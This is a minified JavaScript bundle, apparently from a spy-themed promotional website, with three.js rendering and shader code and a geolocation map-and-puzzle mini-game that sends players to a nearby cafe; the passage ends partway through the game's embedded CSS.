a=document.createElement("div");a.style.WebkitTransformStyle="preserve-3d",a.style.MozTransformStyle="preserve-3d",a.style.oTransformStyle="preserve-3d",a.style.transformStyle="preserve-3d",l.appendChild(a),this.setClearColor=function(){},this.setSize=function(o,n){e=o,t=n,r=e/2,s=t/2,l.style.width=o+"px",l.style.height=n+"px",a.style.width=o+"px",a.style.height=n+"px"};var i=function(e){return Math.abs(e)<1e-6?0:e},c=function(e){var t=e.elements;return"matrix3d("+i(t[0])+","+i(-t[1])+","+i(t[2])+","+i(t[3])+","+i(t[4])+","+i(-t[5])+","+i(t[6])+","+i(t[7])+","+i(t[8])+","+i(-t[9])+","+i(t[10])+","+i(t[11])+","+i(t[12])+","+i(-t[13])+","+i(t[14])+","+i(t[15])+")"},p=function(e){var t=e.elements;return"translate3d(-50%,-50%,0) matrix3d("+i(t[0])+","+i(t[1])+","+i(t[2])+","+i(t[3])+","+i(-t[4])+","+i(-t[5])+","+i(-t[6])+","+i(-t[7])+","+i(t[8])+","+i(t[9])+","+i(t[10])+","+i(t[11])+","+i(t[12])+","+i(t[13])+","+i(t[14])+","+i(t[15])+")"},d=function(e,t){if(e instanceof THREE.CSS3DObject){var r;e instanceof THREE.CSS3DSprite?(o.copy(t.matrixWorldInverse),o.transpose(),o.copyPosition(e.matrixWorld),o.scale(e.scale),o.elements[3]=0,o.elements[7]=0,o.elements[11]=0,o.elements[15]=1,r=p(o)):r=p(e.matrixWorld);var s=e.element,l=n.objects[e.id];(void 0===l||l!==r)&&(s.style.WebkitTransform=r,s.style.MozTransform=r,s.style.oTransform=r,s.style.transform=r,n.objects[e.id]=r),s.parentNode!==a&&a.appendChild(s)}for(var i=0,c=e.children.length;c>i;i++)d(e.children[i],t)};this.render=function(e,o){var i=.5/Math.tan(THREE.Math.degToRad(.5*o.fov))*t;n.camera.fov!==i&&(l.style.WebkitPerspective=i+"px",l.style.MozPerspective=i+"px",l.style.oPerspective=i+"px",l.style.perspective=i+"px",n.camera.fov=i),e.updateMatrixWorld(),void 0===o.parent&&o.updateMatrixWorld(),o.matrixWorldInverse.getInverse(o.matrixWorld);var p="translate3d(0,0,"+i+"px)"+c(o.matrixWorldInverse)+" translate3d("+r+"px,"+s+"px, 0)";n.camera.style!==p&&(a.style.WebkitTransform=p,a.style.MozTransform=p,a.style.oTransform=p,a.style.transform=p,n.camera.style=p),d(e,o)}};
},{}],135:[function(require,module,exports){
THREE.CopyShader={uniforms:{tDiffuse:{type:"t",value:null},opacity:{type:"f",value:1}},vertexShader:["varying vec2 vUv;","void main() {","vUv = uv;","gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["uniform float opacity;","uniform sampler2D tDiffuse;","varying vec2 vUv;","void main() {","vec4 texel = texture2D( tDiffuse, vUv );","gl_FragColor = opacity * texel;","}"].join("\n")};
},{}],136:[function(require,module,exports){
THREE.VerticalTiltShiftShader={uniforms:{tDiffuse:{type:"t",value:null},v:{type:"f",value:1/512},r:{type:"f",value:.35}},vertexShader:["varying vec2 vUv;","void main() {","vUv = uv;","gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["uniform sampler2D tDiffuse;","uniform float v;","uniform float r;","varying vec2 vUv;","void main() {","vec4 sum = vec4( 0.0 );","float vv = v * abs( r - vUv.y );","sum += texture2D( tDiffuse, vec2( vUv.x, vUv.y - 4.0 * vv ) ) * 0.051;","sum += texture2D( tDiffuse, vec2( vUv.x, vUv.y - 3.0 * vv ) ) * 0.0918;","sum += texture2D( tDiffuse, vec2( vUv.x, vUv.y - 2.0 * vv ) ) * 0.12245;","sum += texture2D( tDiffuse, vec2( vUv.x, vUv.y - 1.0 * vv ) ) * 0.1531;","sum += texture2D( tDiffuse, vec2( vUv.x, vUv.y ) ) * 0.1633;","sum += texture2D( tDiffuse, vec2( vUv.x, vUv.y + 1.0 * vv ) ) * 0.1531;","sum += texture2D( tDiffuse, vec2( vUv.x, vUv.y + 2.0 * vv ) ) * 0.12245;","sum += texture2D( tDiffuse, vec2( vUv.x, vUv.y + 3.0 * vv ) ) * 0.0918;","sum += texture2D( tDiffuse, vec2( vUv.x, vUv.y + 4.0 * vv ) ) * 0.051;","gl_FragColor = sum;","}"].join("\n")};
},{}],137:[function(require,module,exports){
THREE.VignetteShader={uniforms:{tDiffuse:{type:"t",value:null},offset:{type:"f",value:1},darkness:{type:"f",value:1}},vertexShader:["varying vec2 vUv;","void main() {","vUv = uv;","gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["uniform float offset;","uniform float darkness;","uniform sampler2D tDiffuse;","varying vec2 vUv;","void main() {","vec4 texel = texture2D( tDiffuse, vUv );","vec2 uv = ( vUv - vec2( 0.5 ) ) * vec2( offset );","gl_FragColor = vec4( mix( texel.rgb, vec3( 1.0 - darkness ), dot( uv, uv ) ), texel.a );","}"].join("\n")};
},{}],138:[function(require,module,exports){
var mobileReconHTML=require("./mobile-recon.html"),MobileReconMain=function(e){function o(e,o){console.log(e.progress+"% loaded")}function t(e,o){I=new PIXI.Graphics,I.position.x=parseInt(window.innerWidth/2),I.position.y=parseInt(window.innerHeight/2),I.position.x=parseInt(window.innerWidth/2),I.position.y=parseInt(window.innerHeight/2),x=new PIXI.Graphics,I.addChild(x),k=new PIXI.Graphics,k.rotation=N(-90),I.addChild(k),M.addChild(I);var t=2*Math.PI,n=0;for(i=1;i<6;i++){var s=new PIXI.Sprite(o["mr"+i].texture);s.hitArea=new PIXI.Circle(0,0,s.width/2),s.anchor.x=.5,s.anchor.y=.5,s.position.x=parseInt(window.innerWidth/2),s.position.y=parseInt(window.innerHeight/2),5==i?s.rotation=0:s.rotation=Math.random()*(t-n)+n,window.innerHeight<window.innerWidth?s.scale.x=s.scale.y=window.innerHeight/H:s.scale.x=s.scale.y=window.innerWidth/H,s.interactive=!0,s.on("mousedown",r),s.on("touchstart",r),s.on("mouseup",c),s.on("mouseupoutside",c),s.on("touchend",c),s.on("touchendoutside",c),s.on("mousemove",m),s.on("touchmove",m),q[i]=s,M.addChild(s)}a(.30001),window.onresize(),console.log("puzzle ready")}function n(e){var o=S-(new Date).getTime();if(0>=o){for(clearInterval(P),console.log("failed"),setTimeout(function(e){E("showMissionFailed")},500),i=1;i<6;i++)TweenMax.to(q[i],.2,{tint:16711680});$("#mr-game-end-text").html("Mission Failed"),$("#mr-game-end-text").addClass("show")}var t=Math.floor(o/6e4),n=Math.floor((o-6e4*t)/1e3),s=Math.floor((o-6e4*t-1e3*n)/10);$(".recon-timer-text").html(j(t,2)+"."+j(n,2)+"."+j(s,2)),"showPuzzle"==A&&a(1-o/12e4),"showMap"==A&&0==s&&$.each(L,function(e,o){})}function a(e){I.removeChild(x),I.removeChild(k),x=new PIXI.Graphics,x.lineStyle(5,10066329,1),x.arc(0,0,340,0,360,!1),x.currentPath.shape.closed=!1,I.addChild(x),k=new PIXI.Graphics,k.lineStyle(5,16760581,1),k.arc(0,0,340,N(0),-N(360*e),!1),k.currentPath.shape.closed=!1,k.rotation=N(-90),I.addChild(k)}function r(e){this.data=e.data,this.alpha=.7,this.tint=16760581,this.dragging=!0}function c(){this.alpha=1,this.tint=16777215,this.dragging=!1,this.data=null,h()}function m(){if(this.dragging){var e=this.data.getLocalPosition(this.parent);vectorX=e.x-this.position.x,vectorY=e.y-this.position.y,rotation=Math.atan2(vectorY,vectorX),TweenMax.to(this,.1,{rotation:rotation})}}function g(){requestAnimationFrame(g),C.render(M)}function h(){for(s=0,i=1;i<6;i++){var e=Math.floor(U(q[i].rotation));console.log("mr"+i+" rotation:",e),Math.abs(e)<3&&(s+=1)}if(console.log(s+" pieces solved."),5==s){for(console.log("puzzle solved"),i=1;i<6;i++)clearInterval(P),TweenMax.to(q[i],.6,{rotation:-360*Math.random()+360}),TweenMax.to(q[i],.5,{rotation:0,delay:.5});TweenMax.to(I,1,{rotation:720}),setTimeout(function(e){E("showMissionPassed")},2e3)}}console.log("MobileReconMain",e),useragent=navigator.userAgent;var w,p,u,y,f,v,b,T,C,M,I,k,x,P,z,S,A,R,W,F=0,q=[],H=740,L=[],W=500,X=5e3,E=function(e){switch(console.log("Requested state change: "+e),A=e,e){case"showWelcome":$(".recon-view").removeClass("show"),$(".recon-welcome").addClass("show"),$(".bg",".recon-welcome").addClass("show-bg");break;case"showMap":$(".recon-view").removeClass("show"),$(".recon-welcome").delay(1e3).hide(),$(".recon-message").removeClass("show"),$(".recon-map").addClass("show"),$(".recon-timer-text").addClass("show"),z=(new Date).getTime(),S=z+9e5,P=setInterval(n,100),G("Secure network located. Procced to "+v.name+" at "+v.vicinity,"map");break;case"mapSolved":console.log("You are within range of the secure network now."),v?target_name=" ("+v.name+")":target_name="",G("You are now within range of the Secure Network"+target_name+".","map"),$(".recon-timer-text").removeClass("show"),setTimeout(function(){E("showPuzzle")},2e3);break;case"showPuzzle":$(".recon-timer-text").css("bottom","20px"),setTimeout(function(){$(".recon-game-text").fadeOut()},5e3),$(".recon-view").removeClass("show"),$(".recon-map").removeClass("show"),setTimeout(function(){$(".recon-map").hide()},1e3),B(),$(".recon-game").addClass("show"),$(".recon-timer-text").addClass("show"),requestAnimationFrame(g),z=(new Date).getTime(),S=z+12e4,P=setInterval(n,100),$(".bg",".recon-game").addClass("show-bg");break;case"showMissionPassed":$(".recon-welcome").hide(),$("#recon-start-button").hide(),$(".recon-timer-text").hide(),$(".recon-view").removeClass("show"),$(".recon-game").removeClass("show"),$(".recon-map").removeClass("show"),setTimeout(function(){$(".recon-map").hide()},1e3),setTimeout(function(){$(".recon-game").hide()},1e3),clearInterval(P),window.cancelAnimationFrame||window.webkitCancelRequestAnimationFrame||window.mozCancelRequestAnimationFrame||window.oCancelRequestAnimationFrame||window.msCancelRequestAnimationFrame||clearTimeout,$(".recon-mission-passed").addClass("show"),$(".bg",".recon-mission-passed").addClass("show-bg");break;case"showMissionFailed":$(".recon-welcome").hide(),$("#recon-start-button").hide(),$("#recon-view-intel-button").hide(),$(".recon-timer-text").hide(),$(".recon-mission-passed").hide(),$(".recon-view").removeClass("show"),$(".recon-game").removeClass("show"),$(".recon-map").removeClass("show"),setTimeout(function(){$(".recon-map").hide()},1e3),setTimeout(function(){$(".recon-game").hide()},1e3),clearInterval(P),window.cancelAnimationFrame||window.webkitCancelRequestAnimationFrame||window.mozCancelRequestAnimationFrame||window.oCancelRequestAnimationFrame||window.msCancelRequestAnimationFrame||clearTimeout,$(".recon-mission-failed").addClass("show"),$(".bg",".recon-mission-failed").addClass("show-bg");break;case"showIntel":$(".recon-view").removeClass("show"),$(".recon-game").removeClass("show"),$(".recon-timer-text").removeClass("show"),setTimeout(function(){$(".recon-game").hide()},1e3),clearInterval(P),window.cancelAnimationFrame||window.webkitCancelRequestAnimationFrame||window.mozCancelRequestAnimationFrame||window.oCancelRequestAnimationFrame||window.msCancelRequestAnimationFrame||clearTimeout,window.open("https://drive.google.com/file/d/0BzSzUwRYY3g0Tm5uSVBReXdTOXc/view?usp=sharing"),window.location="../"}};$(window).keypress(function(e){console.log(e.which),100==e.which&&(e.preventDefault(),E("mapSolved")),102==e.which&&(e.preventDefault(),E("showMissionFailed")),112==e.which&&(e.preventDefault(),E("showMissionPassed"))});var O=function(){e.$el.html(mobileReconHTML),$("#webgl").remove(),e.appModel.trigger("hide-footer"),$("#footer-container").animate({top:"120%"},500),$("#header-container").css({"z-index":1e3}),E("showWelcome"),$.getScript("http://maps.google.com/maps/api/js?key=AIzaSyByAVOaQElx9McNU-QSiT68IAFy1-Y4XNE&libraries=places&sensor=false&callback=initMap"),C=new PIXI.autoDetectRenderer(window.innerWidth,window.innerHeight,{antialias:!0,transparent:!0}),C.view.style.width=window.innerWidth+"px",C.view.style.height=window.innerHeight+"px",$(".recon-game-canvas").append(C.view),M=new PIXI.Container;var n=PIXI.loader;n.add("mr1","assets/imgs/mobile-recon/mr1.png"),n.add("mr2","assets/imgs/mobile-recon/mr2.png"),n.add("mr3","assets/imgs/mobile-recon/mr3.png"),n.add("mr4","assets/imgs/mobile-recon/mr4.png"),n.add("mr5","assets/imgs/mobile-recon/mr5.png"),n.on("progress",o),n.once("complete",t),n.load(),$("#recon-start-button").click(function(e){E("showMap")}),$("#recon-restart-button").click(function(e){window.location.reload()}),$(".recon-view-intel").click(function(e){E("showIntel")})};window.onresize=function(e){console.log("resize fired");var o=window.innerWidth,t=window.innerHeight;for(C.view.style.width=o+"px",C.view.style.height=t+"px",C.resize(o,t),i=1;i<6;i++)l=q[i],l.position.x=parseInt(window.innerWidth/2),l.position.y=parseInt(window.innerHeight/2),window.innerHeight<window.innerWidth?l.scale.x=l.scale.y=window.innerHeight/H:l.scale.x=l.scale.y=window.innerWidth/H;I.position.x=parseInt(window.innerWidth/2),I.position.y=parseInt(window.innerHeight/2),window.innerHeight<window.innerWidth?I.scale.x=I.scale.y=window.innerHeight/H:I.scale.x=I.scale.y=window.innerWidth/H},window.mrPlaceCallback=function(e,o){if(o===google.maps.places.PlacesServiceStatus.OK)if(e.length){var t,n=[];$.each(e,function(e,o){var t=T,a=Math.round(3280.84*D(t.coords.latitude,t.coords.longitude,o.geometry.location.lat(),o.geometry.location.lng()));a>W&&X>a&&(n.push(e),console.log("adding location to array"))}),n.length>0?(console.log("picking random"),rnd=Math.floor(Math.random()*n.length),console.log("random pick:"+rnd),v=e[n[rnd]]):(v=e[0],t=0),targetIcon={path:google.maps.SymbolPath.CIRCLE,scale:8,fillColor:"orange",fillOpacity:.5,strokeWeight:1,strokeColor:"orange",strokeOpacity:.8},enemyIcon={path:google.maps.SymbolPath.CIRCLE,scale:8,fillColor:"red",fillOpacity:.5,strokeWeight:1,strokeColor:"red",strokeOpacity:.8},b=new google.maps.Marker({flat:!0,optimized:!1,visible:!0,title:"Secure Network",icon:targetIcon,position:v.geometry.location,map:p,zIndex:1}),targetMarker2=new google.maps.Marker({visible:!0,icon:{url:"assets/imgs/mobile-recon/flag.png",size:new google.maps.Size(30,59),scaledSize:new google.maps.Size(19.5,38.35),anchor:new google.maps.Point(2,37)},position:v.geometry.location,map:p,zIndex:1}),console.log("HERE",v.geometry.location);var a=new google.maps.Marker({flat:!0,optimized:!1,visible:!0,title:"Potential Threat",icon:enemyIcon,position:new google.maps.LatLng(v.geometry.location.lat()+2e-4*Math.random()-1e-4+.005,v.geometry.location.lng()+2e-4*Math.random()-1e-4-.003),map:p,zIndex:1});L.push(a);var a=new google.maps.Marker({flat:!0,optimized:!1,visible:!0,title:"Potential Threat",icon:enemyIcon,position:new google.maps.LatLng(v.geometry.location.lat()+2e-4*Math.random()-1e-4-.005,v.geometry.location.lng()+2e-4*Math.random()-1e-4+.003),map:p,zIndex:1});L.push(a),console.log("Secure network located. Procced to "+v.name+" at "+v.vicinity),setTimeout(function(e){$("#recon-start-button").addClass("show")},500),$(".recon-message").removeClass("show");var s=[b,w];$.each(L,function(e,o){console.log("add enemy"),s.push(o),console.log(o)});var r=new google.maps.LatLngBounds;for(i=0;i<s.length;i++)r.extend(s[i].getPosition());p.fitBounds(r),console.log("fi bounds called"),setTimeout(function(e){$("#recon-start-button").show().addClass("show")},500),$(".recon-message").removeClass("show")}else if(F){console.log("No secure networks nearby. Boosting scan power. Stand by."),G("No secure networks nearby. Boosting scan power. Stand by.");var l={location:pos,types:["cafe","restaurant","store"],rankBy:google.maps.places.RankBy.DISTANCE};f=new google.maps.places.PlacesService(p),f.nearbySearch(l,mrPlaceCallback),F+=1}else console.log("There are no secure networks nearby. Please try again later."),G("There are no secure networks nearby. Please try again later.");else console.log("We are having trouble connecting."),G("We are having trouble connecting. Please refresh and try again.")},window.initMap=function(){console.log("initialize map"),y=-1!==useragent.indexOf("iPhone")||-1!==useragent.indexOf("Android")?navigator.geolocation.watchPosition(Y,handleWatchError,{enableHighAccuracy:!0}):navigator.geolocation.watchPosition(Y,handleWatchError),mapOptions={zoom:15,styles:u,disableDefaultUI:!0,draggable:!0,zoomControl:!1,scrollwheel:!1,disableDoubleClickZoom:!0},p=new google.maps.Map(document.getElementById("recon-map-canvas"),mapOptions),navigator.geolocation?($(".recon-message").addClass("show"),navigator.geolocation.getCurrentPosition(function(e){if(e.coords.latitude){T=e;var o=new google.maps.LatLng(e.coords.latitude,e.coords.longitude);userIcon={path:google.maps.SymbolPath.CIRCLE,scale:8,fillColor:"white",fillOpacity:.5,strokeWeight:1,strokeColor:"white",strokeOpacity:.8},w=new google.maps.Marker({flat:!0,optimized:!1,visible:!0,title:"You",icon:userIcon,position:o,map:p,zIndex:1}),p.setCenter(o),console.log("Scanning for secure networks near your location.");var t={location:o,types:["cafe"],rankBy:google.maps.places.RankBy.DISTANCE};f=new google.maps.places.PlacesService(p),f.nearbySearch(t,mrPlaceCallback)}else console.log("Got 0 for latitude. Must be an error."),G("You must enable Geolocation to play this game.")},function(){console.log("You must enable Geolocation to play this game."),G("You must enable Geolocation to play this game.")})):(console.log("You must enable Geolocation to play this game."),G("You must enable Geolocation to play this game."))},handleWatchError=function(e){console.log("watch erorr thrown",e)};var Y=function(e){if(console.log("change in location detected, processing"),e.coords.latitude){T=e;var o=new google.maps.LatLng(e.coords.latitude,e.coords.longitude);w.setPosition(o),v&&o&&(d=Math.round(3280.84*D(e.coords.latitude,e.coords.longitude,v.geometry.location.lat(),v.geometry.location.lng())),console.log("Tracking you within "+d+" feet of secure network."),isNaN(d)?console.log("There was a problem finding your distance from the network."):(G("Estimated within "+d+" feet of secure network. Keep moving!","map"),d<100&&E("mapSolved"))),$.each(L,function(o,t){if(d=Math.round(3280.84*D(e.coords.latitude,e.coords.longitude,t.position.lat(),t.position.lng())),console.log("distnace from enemy "+o+":"+d),d<100){for(clearInterval(P),console.log("failed"),setTimeout(function(e){E("showMissionFailed")},500),o=1;6>o;o++)TweenMax.to(q[o],.2,{tint:16711680});$("#mr-game-end-text").html("Mission Failed"),$("#mr-game-end-text").addClass("show")}})}else console.log("Geolocation no longer availalbe. Please check device and try again.")},B=function(){navigator.geolocation.clearWatch(y)},G=function(e,o){console.log("show message for "+o),"map"==o?($(".recon-map-message").removeClass("show"),$(".recon-map-message-text").html(e),$(".recon-map-message").addClass("show"),clearInterval(R),R=setTimeout(function(e){$(".recon-map-message").removeClass("show")},6e3)):($(".recon-message").html(e),$(".recon-message").addClass("show"))},D=function(e,o,t,n){var a=6371,i=N(t-e),s=N(n-o),r=Math.sin(i/2)*Math.sin(i/2)+Math.cos(N(e))*Math.cos(N(t))*Math.sin(s/2)*Math.sin(s/2),l=2*Math.atan2(Math.sqrt(r),Math.sqrt(1-r)),c=a*l;return c},N=function(e){return e*(Math.PI/180)},U=function(e){return e*(180/Math.PI)},j=function(e,o){return e+="",e.length>=o?e:new Array(o-e.length+1).join("0")+e};u=[{featureType:"all",elementType:"labels.text.fill",stylers:[{saturation:36},{color:"#000000"},{lightness:40}]},{featureType:"all",elementType:"labels.text.stroke",stylers:[{visibility:"on"},{color:"#000000"},{lightness:16}]},{featureType:"all",elementType:"labels.icon",stylers:[{visibility:"off"}]},{featureType:"administrative",elementType:"geometry.fill",stylers:[{color:"#000000"},{lightness:20}]},{featureType:"administrative",elementType:"geometry.stroke",stylers:[{color:"#000000"},{lightness:17},{weight:1.2}]},{featureType:"administrative.country",elementType:"labels",stylers:[{weight:"0.01"},{lightness:"100"}]},{featureType:"administrative.province",elementType:"labels",stylers:[{weight:"0.01"},{lightness:"100"}]},{featureType:"administrative.locality",elementType:"labels",stylers:[{weight:"0.01"},{lightness:"100"}]},{featureType:"administrative.neighborhood",elementType:"labels",stylers:[{weight:"0.01"},{lightness:"100"}]},{featureType:"administrative.land_parcel",elementType:"labels",stylers:[{weight:"0.01"},{lightness:"100"}]},{featureType:"landscape",elementType:"geometry",stylers:[{color:"#000000"},{lightness:20}]},{featureType:"landscape.man_made",elementType:"geometry",stylers:[{lightness:"-100"}]},{featureType:"landscape.natural.landcover",elementType:"all",stylers:[{lightness:"-3"}]},{featureType:"poi",elementType:"geometry",stylers:[{color:"#000000"},{lightness:21}]},{featureType:"road.highway",elementType:"geometry.fill",stylers:[{color:"#000000"},{lightness:17}]},{featureType:"road.highway",elementType:"geometry.stroke",stylers:[{color:"#000000"},{lightness:29},{weight:.2}]},{featureType:"road.highway.controlled_access",elementType:"geometry",stylers:[{weight:".5"},{lightness:"30"}]},{featureType:"road.highway.controlled_access",elementType:"labels",stylers:[{weight:"0.01"},{lightness:"100"}]},{featureType:"road.arterial",elementType:"geometry",stylers:[{color:"#000000"},{lightness:"30"},{weight:".5"}]},{featureType:"road.arterial",elementType:"labels",stylers:[{weight:"0.01"},{lightness:"100"}]},{featureType:"road.local",elementType:"geometry",stylers:[{color:"#000000"},{lightness:"30"},{weight:"0.50"}]},{featureType:"road.local",elementType:"labels",stylers:[{weight:"0.01"},{lightness:"100"}]},{featureType:"road.local",elementType:"labels.text",stylers:[{weight:"0.01"}]},{featureType:"transit",elementType:"geometry",stylers:[{color:"#000000"},{lightness:19}]},{featureType:"water",elementType:"geometry",stylers:[{color:"#343434"},{lightness:"-46"}]}],_.extend(this,{enter:function(e){e()},exit:function(e){e()}}),O()};module.exports=MobileReconMain;
},{"./mobile-recon.html":139}],139:[function(require,module,exports){
module.exports='<style>#mobile-recon {\n		position: absolute;\n		height:100%;\n		width:100%;\n		/*background-color: #222222;*/\n		text-align: center;\n		font-size:100%;\n	}\n\n	.recon-view {\n		opacity:0;\n		width:100%;\n		height: 100%;\n		position: absolute;\n		transition: all 1s;\n		text-align: center;\n		\n	}\n\n	.recon-view .bg {\n		opacity:0;\n		width:100%;\n		height: 100%;\n		position: absolute;\n		background-size: cover;\n		transition: all ease-in 1s;\n	}\n\n	.bg.show-bg{\n		opacity:1;\n	}\n\n	.recon-welcome .bg {\n		background: url(assets/imgs/mobile-recon/recon_instructions_bg.jpg) no-repeat center center fixed;\n	}\n\n	.recon-game .bg {\n		background: url(assets/imgs/mobile-recon/puzzle_bg.jpg) no-repeat center center fixed;\n	}\n\n	.recon-mission-passed .bg {\n		background: url(assets/imgs/mobile-recon/completed_bg.jpg) no-repeat center center fixed;\n	}\n\n	.recon-mission-failed .bg {\n		background: url(assets/imgs/mobile-recon/completed_bg.jpg) no-repeat center center fixed;\n	}\n\n	.show { \n		opacity: 1!important;\n	}\n\n	.recon-welcome{\n		z-index: 100;\n	}\n\n	.recon-map{\n		z-index: 90;\n	}\n\n	.recon-game{\n		z-index: 80;\n	}\n\n	.recon-mission-passed{\n		z-index: 70;\n	}\n\n	.recon-mission-failed{\n		z-index: 70;\n	}\n\n	.recon-timer-text{\n		z-index:95;\n		width: 100%;\n		text-align: center;\n		color: white;\n		font-size: 52px;\n		position: absolute;\n		bottom:60px;\n		opacity:0;\n		transition: opacity 1s;\n	}\n\n\n	\n\n	.recon-small-title {\n	    position: relative;\n	    font-size:1.125em;\n	    opacity:.7;\n	    letter-spacing: 5px;\n	    text-transform: uppercase;\n	    overflow: hidden;\n	    cursor: default;\n	    -webkit-user-select: none;\n	    -moz-user-select: none;\n	    -ms-user-select: none;\n	    user-select: none;\n		margin-top:6em;\n	}\n\n	.recon-small-title:before, .recon-small-title:after {\n	    content: \'\';\n	    position: absolute;\n	    top: 50%;\n	    width: 40px;\n	    height: 2px;\n	    background: #ffcb05;\n	}\n\n	.recon-small-title:before {\n    	margin-left: -46px;\n	}\n\n	.recon-small-title:after {\n    	margin-left: 0px;\n	}\n\n\n	.recon-mission-passed .recon-small-title, .recon-mission-failed .recon-small-title{\n		 \n	}\n\n	.recon-title {\n		font-size:3.75em;\n		text-transform: uppercase;\n		opacity:.8;\n		width: 100%; \n		text-align: center; \n		letter-spacing: .4em;\n		padding-left: .4em;\n		margin-top:40px;\n	}\n\n\n	\n\n	.recon-mission-passed .recon-title{\n		font-size:34px;\n		letter-spacing: 14px;\n	}\n\n	.recon-mission-failed .recon-title{\n		font-size:50px;\n		letter-spacing: 20px;\n		\n	}\n\n	.recon-text{\n		font-size:1.125em;\n		opacity:.8;\n		margin-top:30px;\n		line-height:24px;\n		padding-left:10%;\n		padding-right:10%;\n		text-align: center; \n	}\n\n	.recon-message{\n		font-size:1.125em;\n		opacity:.8;\n		color:orange;\n		position: absolute;\n		bottom:0px;\n		line-height:24px;\n		padding-left:10%;\n		padding-right:10%;\n		width:100%;\n		text-align: center;\n		transition: all 0.5s;\n		opacity:0;\n	}\n\n	.recon-message.show{\n		bottom:40px;\n	}\n\n	.recon-header-backer{\n		position: absolute;\n		top:0px;\n		width:100%;\n		height:70px;\n		transition: all 0.5s;\n		background: rgba(0,0,0,.7);\n	}\n\n	.recon-map-message{\n		position: absolute;\n		bottom:0px;\n		width:100%;\n		text-align: center;\n		transition: all 0.5s;\n		opacity:0;\n		background: #000 ;\n		padding-top:5px; padding-bottom: 5px;\n\n	}\n\n\n\n	.recon-map-message.show{\n		bottom:0px;\n	}\n\n	.recon-map-message-text {\n		font-size:1.125em;\n		line-height:20px;\n		color:orange;\n		opacity:.8;\n		padding-left:20px;\n		padding-right:20px;\n	}\n\n	.recon-map-message-icon{\n		width:20px;\n		margin-left:20px; \n		float:left; \n		\n	}\n\n	.recon-map-message-icon img {\n		height:40px;\n	}\n\n\n	.recon-button-circle {\n		width:100px;\n		height:100px;\n		line-height:96px;\n		font-size:24px;\n		text-transform: uppercase;\n		text-align: center;\n		border:1px solid #fff;\n		border-radius:50%;\n		cursor:pointer;\n		transition: all 1s;\n		opacity:0;\n	}\n\n	.recon-mission-passed .recon-button-circle {\n		line-height:30px;\n		padding-top: 19px;\n		border:1px solid orange;\n	}\n	\n\n	.recon-button-circle:hover{\n		background-color: #666666;\n		opacity:.8;\n	}\n\n	.recon-button-circle:active{\n		background-color: #666666;\n		opacity:.8;\n		transform:scale(.9,.9);\n	}\n\n	#recon-start-button{\n		position: absolute;\n		bottom:50px;\n		left:50%;\n    	margin-left: -50px;\n    	display:none;\n	}\n\n\n\n\n	.recon-view-intel{\n		position:absolute;\n		bottom:50px;\n		left:50%;\n		margin-left:-106px;\n    	opacity:1;\n    	width:332px;\n    	height:100px;\n    	cursor:pointer;\n	}\n\n\n	.recon-view-folder {\n		position:absolute;\n		top:0px;\n		left:0px;\n	}\n\n	.recon-view-folder img{\n		height:100px;\n	}\n\n\n	#recon-view-intel-button{\n		position: absolute;\n    	opacity:1;\n    	font-size:20px;\n    	left:115px;\n    	top:0px;\n    	\n	}\n\n\n\n\n\n	#recon-restart-button{\n		position: absolute;\n		bottom:50px;\n		left:50%;\n    	margin-left: -50px;\n    	opacity:1;\n    	font-size:18px;\n    	line-height:28px;\n		padding-top: 21px;\n		border:1px solid orange;\n	}\n\n\n	#recon-map-canvas {\n        height: 100%;\n        width:100%;\n        margin: 0;\n        padding: 0;\n        position: absolute;\n        top:0px; left:0px;\n    }\n\n\n  	.gm-style {\n    	color:#000000;\n    }\n\n    .gm-style-cc { display:none; }\n\n\n    .recon-game{\n    	position: absolute;\n		height:100%;\n		width:100%;\n		text-align: center;\n		margin: 0;\n        padding: 0;\n        opacity:0;\n        transition: all 1s;\n    }\n\n\n     .recon-game-canvas{ \n    	height: 100%;\n        width:100%;\n        margin: 0;\n        padding: 0;\n        position: absolute;\n        top:0px; left:0px;\n    }\n\n    .recon-game-text{\n    	font-size:1.3em;\n		opacity:.8;\n		color:orange;\n		width: 100%; \n		padding:5%;\n		position: absolute;\n		z-index:200;\n		text-align: center; \n		margin-top:40px;\n\n    }\n\n \n 	/* custom map marker animations */\n\n 	@-moz-keyframes pulsate {\n		from {\n			-moz-transform: scale(0.01);\n			opacity: 1;\n		}\n		95% {\n			-moz-transform: scale(1.5);\n			opacity: 0;\n		}\n		to {\n			-moz-transform: scale(0.3);\n			opacity: 0;\n		}\n	}\n	@-webkit-keyframes pulsate {\n		from {\n			-webkit-transform: scale(0.01);\n			opacity: 0.8;\n		}\n		95% {\n			-webkit-transform: scale(1.5);\n			opacity: 0;\n		}\n		to {\n			-webkit-transform: scale(0.3);\n			opacity: 0;\n		}\n	}\n	/* get the container that\'s just outside the marker image, \n		which just happens to have our Marker title in it */\n	 #recon-map-canvas div.gmnoprint[title="You"],  #recon-map-canvas div.gmnoprint[title="Potential Threat"]{\n		-moz-animation: pulsate 1.5s ease-in-out infinite;\n		-webkit-animation: pulsate 1.5s ease-in-out infinite;\n		animation: pulsate 1.5s ease-in-out infinite;\n		border:1px solid rgba(255,140,0,.9);\n		-moz-border-radius:60px;\n		-webkit-border-radius:60px;\n		border-radius:60px;\n		height:60px!important; margin:-35px 0 0 -35px; width:60px!important;\n	}\n\n	#recon-map-canvas div.gmnoprint[title="Secure Network"]{\n		box-shadow:inset 0 0 15px rgba(255,140,0,.7), inset 0 0 15px rgba(255,140,0,.5), inset 0 0 15px rgba(255,140,0,.3), 0 0 5px rgba(255,140,0,.3), 0 0 5px rgba(255,140,0,.7), 0 0 5px rgba(255,140,0,.5);\n		\n	}\n\n	#recon-map-canvas div.gmnoprint[title="You"]{\n		box-shadow:inset 0 0 15px rgba(255,255,255,.7), inset 0 0 15px rgba(255,255,255,.5), inset 0 0 15px rgba(255,255,255,.3), 0 0 5px rgba(255,255,255,.3), 0 0 5px rgba(255,255,255,.7), 0 0 5px rgba(255,255,255,.5);\n	}\n\n	#recon-map-canvas div.gmnoprint[title="Potential Threat"]{\n		box-shadow:inset 0 0 15px rgba(255,0,0,.7), inset 0 0 15px rgba(255,0,0,.5), inset 0 0 15px rgba(255,0,0,.3), 0 0 5px rgba(255,0,0,.3), 0 0 5px rgba(255,0,0,.7), 0 0 5px rgba(255,0,0,.5);\n	}\n\n	\n	/* hide the superfluous marker image since it would expand and shrink with its containing element */\n/*	#map_canvas div[style*="987654"][title] img {*/\n	